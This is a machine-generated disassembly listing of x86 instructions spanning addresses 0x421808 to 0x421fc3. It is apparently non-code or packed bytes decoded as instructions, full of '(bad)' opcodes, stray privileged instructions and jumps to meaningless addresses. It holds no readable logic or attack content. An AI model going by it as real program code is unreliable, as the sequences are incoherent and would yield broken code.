  421808:	xchg   edi,eax
  421809:	repnz enter 0x82bd,0xd1
  42180e:	xlat   BYTE PTR ds:[ebx]
  42180f:	pop    ebx
  421810:	or     dl,BYTE PTR [edx]
  421812:	inc    eax
  421813:	sub    ebp,DWORD PTR ss:[ebx+0x20]
  421817:	test   BYTE PTR [ebx+eiz*1+0x202b1133],ah
  42181e:	dec    DWORD PTR [esi+ebp*4]
  421821:	sub    eax,0x682b472f
  421826:	sub    DWORD PTR [edx*2-0x4a96c3f],edi
  42182d:	in     eax,dx
  42182e:	hlt    
  42182f:	adc    ah,ah
  421831:	add    eax,0xd70b1b91
  421836:	sbb    edi,DWORD PTR [edx-0x8]
  421839:	and    dh,BYTE PTR [eax+0x4acd369f]
  42183f:	js     0x4217fc
  421841:	mov    ah,0xa0
  421843:	and    eax,0xf5631756
  421848:	xchg   esi,eax
  421849:	not    BYTE PTR [edx]
  42184b:	retf   
  42184c:	and    esi,DWORD PTR [ebp+0x2d]
  42184f:	cs scas eax,DWORD PTR es:[edi]
  421851:	jmp    0xfbec4cdc
  421856:	dec    edi
  421857:	xchg   edx,eax
  421858:	mov    ds:0x1778a7cf,eax
  42185d:	mov    eax,0x344421b
  421862:	popw   ss
  421864:	ds push es
  421866:	sub    ebx,DWORD PTR [ebx+0xef1de4b]
  42186c:	xlat   BYTE PTR ds:[ebx]
  42186d:	dec    esp
  42186e:	popf   
  42186f:	test   BYTE PTR [edx],0x8d
  421872:	dec    esp
  421873:	ins    BYTE PTR es:[edi],dx
  421874:	test   eax,0xf4839ea
  421879:	mov    WORD PTR [edi-0x2e0ddfd9],fs
  42187f:	out    0x3a,eax
  421881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421882:	sub    BYTE PTR [eax+0x36],dh
  421885:	xchg   edi,eax
  421886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421887:	pop    esp
  421888:	jmp    DWORD PTR [ecx]
  42188a:	mov    BYTE PTR [ebp-0x3],cl
  42188d:	pop    ecx
  42188e:	pop    edi
  42188f:	loop   0x42190f
  421891:	xchg   ecx,eax
  421892:	inc    esi
  421893:	cmp    ecx,DWORD PTR [edi+0x5a3e0639]
  421899:	xor    al,0x3e
  42189b:	jne    0x4218d5
  42189d:	ret    0x4a51
  4218a0:	inc    ebp
  4218a1:	jns    0x421860
  4218a3:	shl    DWORD PTR [ebp+eax*4+0x2d],0x52
  4218a8:	dec    ebx
  4218a9:	imul   ebx,DWORD PTR [edx],0x40ed7ca7
  4218af:	cld    
  4218b0:	pop    esp
  4218b1:	sub    eax,0x1bf147c3
  4218b6:	or     al,BYTE PTR [ebx-0x26d6fb17]
  4218bc:	cdq    
  4218bd:	mov    esp,DWORD PTR [ebx-0x66]
  4218c0:	adc    esi,DWORD PTR [edi-0x4a]
  4218c3:	sub    BYTE PTR [ecx+0x55fe9b56],ch
  4218c9:	push   esp
  4218ca:	cmp    DWORD PTR ds:0x3a5157b0,0x87799cd8
  4218d4:	test   bh,cl
  4218d6:	int3   
  4218d7:	mov    eax,ds:0x93e33fb
  4218dc:	inc    ecx
  4218dd:	js     0x4218eb
  4218df:	adc    dh,BYTE PTR [ecx+0x25]
  4218e2:	scas   al,BYTE PTR es:[edi]
  4218e3:	retf   0xa082
  4218e6:	pop    esp
  4218e7:	inc    eax
  4218e8:	xchg   edi,eax
  4218e9:	cmp    dl,BYTE PTR [ecx-0x15092bf7]
  4218ef:	aad    0xc9
  4218f1:	rcl    BYTE PTR [ebx-0x4c],0x23
  4218f5:	aas    
  4218f6:	jne    0x4218a5
  4218f8:	and    al,0x5e
  4218fa:	and    DWORD PTR [ecx],ebp
  4218fc:	repz fisubr WORD PTR [edi+0x7b834a0a]
  421903:	shr    dh,0xfa
  421906:	(bad)  
  421907:	xor    DWORD PTR [eax],edi
  421909:	xor    dh,dl
  42190b:	test   eax,0xeff8
	...
  421918:	add    BYTE PTR [eax],al
  42191a:	mov    al,0x33
  42191c:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  421922:	pop    DWORD PTR [edx-0x44]
  421925:	mov    ah,BYTE PTR [eax]
  421927:	push   esi
  421928:	js     0x42196e
  42192a:	in     al,0x94
  42192c:	add    DWORD PTR [eax],eax
  42192e:	cld    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [edx+0x24],bh
  421934:	in     eax,0xef
  421936:	sub    DWORD PTR [edx],esi
  421938:	ins    DWORD PTR es:[edi],dx
  421939:	add    al,0xa
  42193b:	js     0x4218eb
  42193d:	adc    eax,DWORD PTR [edi+0x44ac7c9f]
  421943:	add    BYTE PTR [edi],0x8e
  421946:	mov    ebx,0x69d4ccc4
  42194b:	icebp  
  42194c:	or     ch,BYTE PTR [edi+0x33e2e9dd]
  421952:	pop    ebp
  421953:	ficom  DWORD PTR [ebp+0x57]
  421956:	(bad)  
  421957:	pop    eax
  421958:	fwait
  421959:	jle    0x4219a1
  42195b:	cwde   
  42195c:	test   al,0x54
  42195e:	pop    esp
  42195f:	daa    
  421960:	mov    esp,0x5d6a59d2
  421965:	and    BYTE PTR [edx-0x43903f94],al
  42196b:	stos   BYTE PTR es:[edi],al
  42196c:	and    ch,BYTE PTR [edi]
  42196e:	lahf   
  42196f:	test   eax,0x79c5a8e6
  421974:	mov    ebp,0xedbb45f2
  421979:	jle    0x4219cb
  42197b:	stos   DWORD PTR es:[edi],eax
  42197c:	inc    ebp
  42197d:	and    edi,DWORD PTR [eax]
  42197f:	imul   esp,DWORD PTR [eax],0x7904c677
  421985:	cs ss dec edi
  421988:	addr16 sub edi,eax
  42198b:	(bad)  
  42198c:	adc    eax,0x95c99422
  421991:	pop    esi
  421992:	xor    DWORD PTR [ebx],edi
  421994:	in     eax,dx
  421995:	push   eax
  421996:	call   0xb685:0xfb2ae8d6
  42199d:	cdq    
  42199e:	sub    DWORD PTR [edx],0xe0e98d9d
  4219a4:	dec    ecx
  4219a5:	imul   ebx,DWORD PTR [edx],0x2d
  4219a8:	inc    ebp
  4219a9:	(bad)  
  4219aa:	xchg   esp,eax
  4219ab:	repz and BYTE PTR [ebp+eax*2-0x48],al
  4219b0:	push   ecx
  4219b1:	mov    bl,0x5
  4219b3:	mov    ds:0x84293d75,eax
  4219b8:	(bad)  
  4219ba:	scas   eax,DWORD PTR es:[edi]
  4219bb:	mov    ss,eax
  4219bd:	dec    esp
  4219be:	cmp    eax,0x620ab96d
  4219c3:	lahf   
  4219c4:	ret    0xeb12
  4219c7:	or     edx,DWORD PTR [eax-0x12022579]
  4219cd:	inc    edi
  4219ce:	pop    ebp
  4219cf:	pop    esp
  4219d0:	mov    cl,cl
  4219d2:	lahf   
  4219d3:	inc    ebx
  4219d4:	frndint 
  4219d6:	hlt    
  4219d7:	pop    ebp
  4219d8:	fistp  DWORD PTR [eax]
  4219da:	fscale 
  4219dc:	in     al,0x1d
  4219de:	fld    DWORD PTR [edx-0x4e]
  4219e1:	daa    
  4219e2:	dec    DWORD PTR [edx]
  4219e4:	xor    DWORD PTR [edx-0x26],0xf
  4219e8:	call   0x9c7c:0x5a03e687
  4219ef:	xor    BYTE PTR [ebx-0x7e],0x53
  4219f3:	nop
  4219f4:	push   ecx
  4219f5:	out    0x83,al
  4219f7:	jbe    0x4219f3
  4219f9:	mul    BYTE PTR [eax+0x54269b3d]
  4219ff:	lea    esp,ds:0x78f81d9
  421a05:	rcr    DWORD PTR [ebx-0x7b0e760b],0xb5
  421a0c:	jnp    0x4219b7
  421a0e:	cwde   
  421a0f:	adc    eax,0xb1395434
  421a14:	rcr    DWORD PTR [edi-0x53],0x2c
  421a18:	out    dx,eax
  421a19:	bound  eax,QWORD PTR [edx+edi*2+0x6]
  421a1d:	sahf   
  421a1e:	out    dx,al
  421a1f:	add    al,0xbb
  421a21:	mov    cl,0xd6
  421a23:	add    BYTE PTR [ebp+ebx*1-0x3b],dh
  421a27:	jecxz  0x421a1c
  421a29:	mov    al,ds:0xd5cf4eb1
  421a2e:	add    eax,DWORD PTR [edi+0x40]
  421a31:	shl    BYTE PTR [eax+0x37b275ca],0xef
  421a38:	ficom  DWORD PTR [eax]
  421a3a:	test   DWORD PTR [ecx],esp
  421a3c:	lods   al,BYTE PTR ds:[esi]
  421a3d:	or     ch,dl
  421a3f:	sar    BYTE PTR [edx],cl
  421a41:	xchg   edx,eax
  421a42:	xchg   ebp,edi
  421a44:	push   ds
  421a45:	cdq    
  421a46:	inc    ebx
  421a47:	dec    BYTE PTR [ebp+eiz*1+0x2]
  421a4b:	pop    ds
  421a4c:	addr16 jmp 0x421a2d
  421a4f:	and    al,0x7
  421a51:	inc    ecx
  421a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a53:	and    eax,0xc8cae044
  421a58:	fbld   TBYTE PTR [ebx-0x32]
  421a5b:	jnp    0x421a91
  421a5d:	lods   eax,DWORD PTR ds:[esi]
  421a5e:	hlt    
  421a5f:	call   0xdae2:0x5d561410
  421a66:	xor    eax,DWORD PTR [ebx-0x62]
  421a69:	mov    al,ds:0xc9c33484
  421a6e:	repnz aam 0x3
  421a71:	mov    esp,0xd882473b
  421a76:	add    eax,0xbcd95113
  421a7b:	sub    ah,BYTE PTR [eax+edi*8-0x65]
  421a7f:	inc    edi
  421a80:	or     ebx,ecx
  421a82:	jo     0x421a3e
  421a84:	push   es
  421a85:	mov    ecx,0x7a236818
  421a8a:	in     eax,0x7
  421a8c:	je     0x421ae7
  421a8e:	mov    ecx,DWORD PTR [ebp+0x25]
  421a91:	add    DWORD PTR [edi+0x39],esi
  421a94:	mov    dh,0x90
  421a96:	fstp   QWORD PTR [esi]
  421a98:	adc    ch,ah
  421a9a:	shl    ebp,cl
  421a9c:	iret   
  421a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a9e:	and    dl,BYTE PTR [edi+ebx*4-0x6f]
  421aa2:	test   BYTE PTR [ebx+0x25],ah
  421aa5:	iret   
  421aa6:	icebp  
  421aa7:	mov    ds,WORD PTR [esi-0x5b86b623]
  421aad:	addr16 cmp eax,0x9ad366f7
  421ab3:	les    esi,FWORD PTR [ebx-0x6]
  421ab6:	push   edi
  421ab7:	and    eax,0x9895d3ad
  421abc:	pop    esi
  421abd:	stc    
  421abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421abf:	mov    DWORD PTR [edx],eax
  421ac1:	data16 arpl WORD PTR [ebp-0x4ba2fd55],dx
  421ac8:	add    ecx,DWORD PTR [edi-0x3b]
  421acb:	rcr    DWORD PTR ss:[ebp+eiz*4+0x72],1
  421ad0:	mov    ebp,0x21ba3697
  421ad5:	bound  esi,QWORD PTR [eax-0x6eb8a901]
  421adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421adc:	imul   BYTE PTR [ebx-0xc]
  421adf:	loopne 0x421b30
  421ae1:	leave  
  421ae2:	dec    ecx
  421ae3:	paddb  mm2,mm7
  421ae6:	sar    bh,0xce
  421ae9:	repz dec ecx
  421aeb:	add    BYTE PTR [esi],bl
  421aed:	xchg   edi,eax
  421aee:	mov    cl,0xa5
  421af0:	mov    esp,0x9942c0c
  421af5:	(bad)  
  421af6:	push   edi
  421af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421af8:	mov    ch,BYTE PTR [eax-0x40]
  421afb:	popf   
  421afc:	cmp    DWORD PTR [esi+0x7e000b6a],esp
  421b02:	call   0xabfbc76e
  421b07:	js     0x421ad5
  421b09:	stos   DWORD PTR es:[edi],eax
  421b0a:	in     eax,0x66
  421b0c:	xor    ch,cl
  421b0e:	jmp    0x421b7d
  421b10:	cmp    DWORD PTR ds:0x33408130,edi
  421b16:	call   0xaeb56685
  421b1b:	sub    ebx,esp
  421b1d:	nop
  421b1e:	mov    BYTE PTR [ebx+0x18166410],ch
  421b24:	ja     0x421aea
  421b26:	std    
  421b27:	mov    edx,0x7cffd432
  421b2c:	xor    cl,ah
	...
  421b3a:	test   eax,0xff94c95e
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0x8c4bf8f7
  421b48:	lea    edi,[esi+0x196e0]
  421b4e:	cld    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    BYTE PTR [ebp-0x29],bl
  421b54:	mov    al,0xdf
  421b56:	mov    al,ds:0xd0c16afe
  421b5b:	push   ebx
  421b5c:	dec    edx
  421b5d:	sahf   
  421b5e:	cmp    eax,0x62e27156
  421b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b64:	inc    edx
  421b65:	retf   0xca85
  421b68:	dec    edi
  421b69:	inc    ecx
  421b6a:	sahf   
  421b6b:	mov    bl,0x62
  421b6d:	adc    DWORD PTR [ebp+0x41],esp
  421b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b71:	ror    DWORD PTR [eax+0x4693a286],1
  421b77:	jb     0x421b9d
  421b79:	loop   0x421b39
  421b7b:	xchg   esi,eax
  421b7c:	jmp    0x421bf2
  421b7e:	adc    al,dl
  421b80:	inc    ebx
  421b81:	and    eax,0xbd582e25
  421b86:	lock push edi
  421b88:	xchg   esp,eax
  421b89:	pop    esp
  421b8a:	and    DWORD PTR [esi],edi
  421b8c:	iret   
  421b8d:	or     BYTE PTR [edi+0x21],dl
  421b90:	test   BYTE PTR [ebx],0xf8
  421b93:	sbb    DWORD PTR [ebx+0x73],edi
  421b96:	jp     0x421ba6
  421b98:	dec    esi
  421b99:	jbe    0x421b4b
  421b9b:	mov    ?,WORD PTR [ecx+0x28]
  421b9e:	pop    esp
  421b9f:	scas   eax,DWORD PTR es:[edi]
  421ba0:	add    BYTE PTR ds:0xa21cd44c,dl
  421ba6:	leave  
  421ba7:	pop    ebp
  421ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ba9:	pop    ebp
  421baa:	nop
  421bab:	adc    eax,0x63745e34
  421bb0:	(bad)
  421bb4:	in     eax,0xf1
  421bb6:	inc    edi
  421bb7:	inc    edx
  421bb8:	sub    al,0x6b
  421bba:	jmp    0xcf785baa
  421bbf:	jbe    0x421b8e
  421bc1:	out    dx,eax
  421bc2:	fmul   st,st(3)
  421bc4:	das    
  421bc5:	jne    0x421b95
  421bc7:	stos   BYTE PTR es:[edi],al
  421bc8:	loopne 0x421c2b
  421bca:	fisub  WORD PTR [ecx+0x38ce32a]
  421bd0:	test   ebp,esi
  421bd2:	add    BYTE PTR [ebx+0x67],dh
  421bd5:	out    dx,al
  421bd6:	imul   esi
  421bd8:	xchg   ebx,eax
  421bd9:	adc    esp,esp
  421bdb:	jb     0x421bdb
  421bdd:	repnz ins BYTE PTR es:[edi],dx
  421bdf:	(bad)  
  421be0:	push   ebx
  421be1:	sbb    BYTE PTR [edi],ch
  421be3:	(bad)  
  421be4:	xor    BYTE PTR [esi+0x23],ah
  421be7:	mov    eax,0x99a8c742
  421bec:	sub    BYTE PTR [ebx+eax*8],cl
  421bef:	pusha  
  421bf0:	sub    BYTE PTR [ecx],0x7c
  421bf3:	push   0x3b36c152
  421bf8:	xchg   edx,eax
  421bf9:	loop   0x421ba8
  421bfb:	int    0xb7
  421bfd:	pop    es
  421bfe:	fs iret 
  421c00:	pop    edx
  421c01:	repnz pop esi
  421c03:	(bad)  
  421c04:	sbb    ecx,edx
  421c06:	or     DWORD PTR [ebx+0x72cdaaa6],esp
  421c0c:	ror    esp,1
  421c0e:	or     DWORD PTR [eax-0xb37c06d],ebx
  421c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c15:	fmul   DWORD PTR cs:[edx]
  421c18:	sar    bl,1
  421c1a:	fwait
  421c1b:	loopne 0x421bd2
  421c1d:	test   DWORD PTR [esi+0x1c],eax
  421c20:	pop    ss
  421c21:	push   ds
  421c22:	cmc    
  421c23:	jo     0x421bfd
  421c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c26:	and    al,0xea
  421c28:	mov    edi,0x2f9c5bbc
  421c2d:	enter  0xa3fd,0xa1
  421c31:	(bad)  
  421c32:	sbb    al,al
  421c34:	cmp    dh,BYTE PTR [edx-0x64786c4]
  421c3a:	fucomi st,st(5)
  421c3c:	sti    
  421c3d:	aam    0xa1
  421c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c40:	jle    0x421bc9
  421c42:	inc    eax
  421c43:	pusha  
  421c44:	imul   edx,DWORD PTR [edi],0xffffffa3
  421c47:	mov    edx,0x15e9e108
  421c4c:	push   ecx
  421c4d:	pop    edx
  421c4e:	sub    dl,BYTE PTR [ebp+0x2d7e96e2]
  421c54:	cli    
  421c55:	out    dx,eax
  421c56:	sub    al,0x9b
  421c58:	stc    
  421c59:	(bad)  
  421c5a:	sbb    ch,bl
  421c5c:	imul   esp,DWORD PTR [esi],0xffffffd6
  421c5f:	mov    WORD PTR [ecx+0x36ab618b],fs
  421c65:	out    0x3e,al
  421c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c68:	adc    eax,0xbe52d5d
  421c6d:	dec    eax
  421c6e:	leave  
  421c6f:	cmp    BYTE PTR [edx-0x2301825f],dl
  421c75:	jge    0x421cc5
  421c77:	outs   dx,BYTE PTR ds:[esi]
  421c78:	add    BYTE PTR [ecx+0x350c6f9],ch
  421c7e:	pop    esp
  421c7f:	pop    edx
  421c80:	stos   DWORD PTR es:[edi],eax
  421c81:	cld    
  421c82:	cs sub eax,0xeb488c0a
  421c88:	fld    TBYTE PTR [ebx]
  421c8a:	stos   BYTE PTR es:[edi],al
  421c8b:	ror    ebp,1
  421c8d:	add    bl,dl
  421c8f:	imul   edi,DWORD PTR [eax-0x56],0xb46b68aa
  421c96:	ins    DWORD PTR es:[edi],dx
  421c97:	add    DWORD PTR [edx],0x5b
  421c9a:	pushf  
  421c9b:	mov    cl,ah
  421c9d:	and    BYTE PTR [edx+0x5703f65f],0x1e
  421ca4:	push   0x56f15da9
  421ca9:	add    BYTE PTR [ecx+0x7d],dh
  421cac:	scas   eax,DWORD PTR es:[edi]
  421cad:	xor    dl,BYTE PTR [esi+ebx*4-0x59]
  421cb1:	jo     0x421c3a
  421cb3:	xlat   BYTE PTR fs:[ebx]
  421cb5:	das    
  421cb6:	mov    bh,0x42
  421cb8:	mov    esi,DWORD PTR [eax-0x68]
  421cbb:	gs out 0xeb,al
  421cbe:	mov    esp,0x7ef6d29f
  421cc3:	dec    ecx
  421cc4:	jb     0x421c9f
  421cc6:	mov    DWORD PTR [edi],esi
  421cc8:	cwde   
  421cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cca:	mov    edi,0x7b11cb63
  421ccf:	pop    ss
  421cd0:	cmp    bl,BYTE PTR [edx+0x6f]
  421cd3:	push   cs
  421cd4:	mov    eax,ds:0x19cedbdd
  421cd9:	pop    ebx
  421cda:	mov    eax,0xc20b7a49
  421cdf:	fisttp QWORD PTR [esi+0x41]
  421ce2:	adc    esi,esi
  421ce4:	push   ebp
  421ce5:	test   DWORD PTR [esp+esi*2],esp
  421ce8:	outs   dx,BYTE PTR ds:[esi]
  421ce9:	jne    0x421cc1
  421ceb:	push   ecx
  421cec:	jmp    0x421c91
  421cee:	xor    DWORD PTR [eax-0x17f33657],0x50
  421cf5:	mov    ds:0x4118557f,eax
  421cfa:	ins    DWORD PTR es:[edi],dx
  421cfb:	lods   eax,DWORD PTR ds:[esi]
  421cfc:	sti    
  421cfd:	loope  0x421d5e
  421cff:	retf   0x23f5
  421d02:	pop    ss
  421d03:	jae    0x421d20
  421d05:	sbb    al,0x57
  421d07:	fnstenv [edx-0x323a0199]
  421d0d:	mov    bh,0x56
  421d0f:	xchg   DWORD PTR [eax+0x42],eax
  421d12:	push   eax
  421d13:	inc    esi
  421d14:	cmp    DWORD PTR [ebx+0x5a],ecx
  421d17:	xor    bh,dl
  421d19:	es (bad) 
  421d1b:	std    
  421d1c:	ret    0x364c
  421d1f:	xchg   esi,eax
  421d20:	out    dx,eax
  421d21:	in     al,dx
  421d22:	(bad)
  421d25:	cmp    bl,al
  421d27:	push   0x4b9ed949
  421d2c:	push   es
  421d2d:	pop    ecx
  421d2e:	nop
  421d2f:	aas    
  421d30:	pop    esp
  421d31:	loopne 0x421ce4
  421d33:	xchg   ebx,eax
  421d34:	sub    BYTE PTR [edx+ecx*1+0x58e8b6f5],bl
  421d3b:	and    DWORD PTR [edx-0x50d002f0],edi
  421d41:	fcmovne st,st(0)
  421d43:	stos   DWORD PTR es:[edi],eax
  421d44:	push   cs
  421d45:	and    DWORD PTR ds:[eax],0xc6098e2
  421d4c:	mov    ah,0xd4
	...
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	test   BYTE PTR [esi+ebx*1+0x198dc7a],bl
  421d6d:	add    ah,bh
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [ecx+0x2c],bh
  421d74:	push   ss
  421d75:	pushf  
  421d76:	mov    ebp,0x7acf9daf
  421d7b:	dec    esp
  421d7c:	jne    0x421db4
  421d7e:	out    0x4,eax
  421d80:	int    0x9b
  421d82:	rcl    BYTE PTR [edx],1
  421d84:	cdq    
  421d85:	imul   eax,eax,0x9df5df74
  421d8b:	add    ah,BYTE PTR ds:0x23b57975
  421d91:	je     0x421d92
  421d93:	xor    esp,ebp
  421d95:	out    0xde,eax
  421d97:	stc    
  421d98:	pop    esi
  421d99:	add    dl,BYTE PTR [eax-0x236e0489]
  421d9f:	bound  edx,QWORD PTR [edx]
  421da1:	ret    
  421da2:	pop    edx
  421da3:	push   edx
  421da4:	mov    eax,ds:0x88df10b4
  421da9:	into   
  421daa:	ror    edx,0x6f
  421dad:	mov    edi,0x4aad1dfa
  421db2:	push   esp
  421db3:	dec    ebp
  421db4:	push   edx
  421db5:	lea    esp,[ebp-0x19]
  421db8:	jmp    0x5c16de74
  421dbd:	sbb    eax,0x4d9174fb
  421dc2:	lea    edx,gs:[ebx+0x3660aa22]
  421dc9:	jns    0x421df8
  421dcb:	out    0x27,al
  421dcd:	pop    ds
  421dce:	(bad)  
  421dcf:	xor    al,0x39
  421dd1:	aam    0x9a
  421dd3:	ds xchg ebx,eax
  421dd5:	nop
  421dd6:	loop   0x421e0b
  421dd8:	mov    ebp,0x8a4e6940
  421ddd:	jns    0x421d7f
  421ddf:	ds mov bh,0xea
  421de2:	dec    esp
  421de3:	or     bl,ch
  421de5:	ins    BYTE PTR es:[edi],dx
  421de6:	cmp    DWORD PTR [esi-0x52],0xfc963732
  421ded:	ret    0x34ee
  421df0:	js     0x421e2a
  421df2:	daa    
  421df3:	je     0x421dfe
  421df5:	call   FWORD PTR [esi-0x5dbab23f]
  421dfb:	ja     0x421e6d
  421dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dfe:	in     eax,0x1a
  421e00:	stos   BYTE PTR es:[edi],al
  421e01:	jg     0x421d9f
  421e03:	ja     0x421dd7
  421e05:	je     0x421e3b
  421e07:	or     DWORD PTR [ebp-0x71],ebp
  421e0a:	push   edi
  421e0b:	or     al,0x68
  421e0d:	loope  0x421e2e
  421e0f:	sbb    DWORD PTR [esi+0x2b],esi
  421e12:	cld    
  421e13:	or     edi,ebp
  421e15:	sti    
  421e16:	loopne 0x421db8
  421e18:	(bad)  
  421e19:	es dec eax
  421e1b:	sbb    ah,BYTE PTR [ecx+0x562d8f]
  421e21:	xchg   BYTE PTR [eax+ebp*1-0x6f9dffd3],cl
  421e28:	add    BYTE PTR [eax+0x3f],ch
  421e2b:	pop    es
  421e2c:	ret    0x8b57
  421e2f:	mov    al,ds:0xadb20077
  421e34:	inc    ebx
  421e35:	sti    
  421e36:	dec    ecx
  421e37:	jns    0x421e9b
  421e39:	daa    
  421e3a:	ins    DWORD PTR es:[edi],dx
  421e3b:	xor    cl,dh
  421e3d:	inc    edx
  421e3e:	xor    esi,DWORD PTR [ebx-0x631af4d7]
  421e44:	add    DWORD PTR [ebx-0x115774c5],edi
  421e4a:	jns    0x421dea
  421e4c:	jmp    0x421e62
  421e4e:	and    ebx,esi
  421e50:	jb     0x421e99
  421e52:	cld    
  421e53:	xchg   edx,eax
  421e54:	cmp    al,0xe8
  421e56:	loope  0x421e5d
  421e58:	test   al,0x68
  421e5a:	(bad)  
  421e5b:	cs popf 
  421e5d:	mov    ecx,0x548ff298
  421e62:	outs   dx,DWORD PTR ds:[esi]
  421e63:	xchg   DWORD PTR [ebx-0x71b283b4],edx
  421e69:	jne    0x421e3e
  421e6b:	int    0x18
  421e6d:	cmp    al,0x1e
  421e6f:	pop    esp
  421e70:	xchg   DWORD PTR [ebp+0x2b],eax
  421e73:	sbb    DWORD PTR [edi-0x13],esp
  421e76:	add    eax,0xb713b1df
  421e7b:	(bad)  
  421e7c:	mov    dl,0xa9
  421e7e:	and    BYTE PTR [ebx+0x1a],ch
  421e81:	xlat   BYTE PTR ds:[ebx]
  421e82:	xor    eax,DWORD PTR [ebp-0x74]
  421e85:	popa   
  421e86:	arpl   WORD PTR [eax+0x75a4f931],bx
  421e8c:	cmp    al,0x2b
  421e8e:	fdiv   QWORD PTR [ecx]
  421e90:	fimul  DWORD PTR [ecx]
  421e92:	sbb    al,0xc8
  421e94:	sub    BYTE PTR [ebx+ebx*8-0x3b],0xf5
  421e99:	fmul   QWORD PTR [edi+0x21]
  421e9c:	jne    0x421ef7
  421e9e:	xor    eax,DWORD PTR [ebp*8+0x7bd41ea]
  421ea5:	mov    BYTE PTR [edi-0x61],al
  421ea8:	pop    edi
  421ea9:	cs jno 0x421e87
  421eac:	ror    BYTE PTR [edi],0xc5
  421eaf:	and    eax,0xea14dbb4
  421eb4:	and    BYTE PTR [ebp+esi*2-0x17],bh
  421eb8:	dec    edx
  421eb9:	inc    esi
  421eba:	mov    ecx,ecx
  421ebc:	dec    edx
  421ebd:	inc    esi
  421ebe:	iret   
  421ebf:	aas    
  421ec0:	sbb    al,BYTE PTR [esi+0x37aabfd6]
  421ec6:	or     dl,bh
  421ec8:	imul   ecx,ecx,0xffffff80
  421ecb:	inc    esi
  421ecc:	jmp    0xd9c88e8b
  421ed1:	scas   al,BYTE PTR es:[edi]
  421ed2:	loopne 0x421f42
  421ed4:	mov    esp,DWORD PTR [ebx]
  421ed6:	xchg   DWORD PTR ds:0x2717c42f,esp
  421edc:	pop    esi
  421edd:	ja     0x421ee1
  421edf:	xchg   ebp,eax
  421ee0:	in     eax,dx
  421ee1:	push   es
  421ee2:	mov    edi,ebp
  421ee4:	clc    
  421ee5:	lock or eax,0xa988001f
  421eeb:	inc    esi
  421eec:	lods   eax,DWORD PTR ds:[esi]
  421eed:	xchg   ecx,eax
  421eee:	pop    es
  421eef:	cmp    eax,0xb854564d
  421ef4:	sbb    edx,ebp
  421ef6:	cmp    BYTE PTR [esp+ebp*4-0x5d],ah
  421efa:	xchg   ebx,eax
  421efb:	cli    
  421efc:	pop    ss
  421efd:	inc    esp
  421efe:	(bad)  
  421f00:	stc    
  421f01:	and    al,0x74
  421f03:	ss inc ebx
  421f05:	jecxz  0x421f3f
  421f07:	jns    0x421f72
  421f09:	into   
  421f0a:	xor    al,BYTE PTR ds:0x5546bf2d
  421f10:	out    0x87,eax
  421f12:	xlat   BYTE PTR ds:[ebx]
  421f13:	pop    ecx
  421f14:	jo     0x421f5c
  421f16:	mov    al,0xc2
  421f18:	or     eax,0xbfdfc198
  421f1d:	pop    esi
  421f1e:	rcr    DWORD PTR [esp-0x6d],1
  421f22:	jecxz  0x421ef6
  421f24:	loope  0x421f2d
  421f26:	xor    al,0x8f
  421f28:	sub    dl,BYTE PTR [eax+0x2a1c003e]
  421f2e:	lods   eax,DWORD PTR ds:[esi]
  421f2f:	mov    edx,0x76d69a4b
  421f34:	dec    ebx
  421f35:	(bad)  
  421f36:	jns    0x421f26
  421f38:	shl    BYTE PTR [ebx-0x5f9b2b87],0xa0
  421f3f:	jo     0x421ef4
  421f41:	mov    edx,0x21c95706
  421f46:	test   BYTE PTR [ebp+0x6c31b422],bl
  421f4c:	push   esp
  421f4d:	out    dx,eax
  421f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f4f:	xor    bl,al
  421f51:	fbld   TBYTE PTR [ebx]
  421f53:	into   
  421f54:	and    eax,0x42f712be
  421f59:	xor    al,0x1d
  421f5b:	test   eax,0x307e688a
  421f60:	cmp    ah,al
  421f62:	mov    bh,0xf6
  421f64:	out    0x55,al
  421f66:	xor    eax,0x953387f6
  421f6b:	jbe    0x421f81
  421f6d:	cmp    al,BYTE PTR [eax]
	...
  421f77:	add    BYTE PTR [eax],al
  421f79:	add    dh,ch
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [esi-0x2763ca3e],dh
  421f8b:	call   0x0:0x1fc0001
  421f92:	cwde   
  421f93:	mov    ebx,0xf8de36dc
  421f98:	mov    bl,0x10
  421f9a:	pop    ds
  421f9b:	daa    
  421f9c:	daa    
  421f9d:	rol    DWORD PTR [ebp-0x4a27fec6],cl
  421fa3:	and    bl,BYTE PTR [ebx]
  421fa5:	push   edx
  421fa6:	pusha  
  421fa7:	cs fsubr st,st(1)
  421faa:	mov    bl,0xa3
  421fac:	xor    esi,DWORD PTR [esi+eax*4-0x207d3988]
  421fb3:	add    eax,0xc27363d3
  421fb8:	icebp  
  421fb9:	xchg   ecx,eax
  421fba:	cmp    dl,BYTE PTR [ebp-0x4eb42ba3]
  421fc0:	aaa    
  421fc1:	push   ss
  421fc2:	inc    esp
  421fc3:	xchg   ebp,eax
